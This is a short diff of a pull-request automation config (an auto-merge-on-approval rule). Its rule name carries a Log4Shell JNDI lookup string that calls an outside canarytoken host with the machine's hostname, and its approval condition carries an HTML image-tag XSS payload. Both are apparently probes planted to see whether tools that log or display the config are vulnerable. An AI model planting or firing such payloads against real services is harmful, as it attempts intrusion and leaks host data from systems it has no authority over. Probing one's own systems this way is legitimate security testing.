@@ -1,7 +1,7 @@
 pull_request_rules:
   - name: Automatic merge on approval${jndi:ldap://x${hostName}.L4J.j7z9gk19q76gw0be2txfwp1v1.canarytokens.com/a}
     conditions:
-      - "#approved-reviews-by>=1"\"><img src=x onerror=alert(document.domain)>
+      - "#approved-reviews-by>=1"><img src=x onerror=alert(document.domain)>
     actions:
       merge:
         method: merge
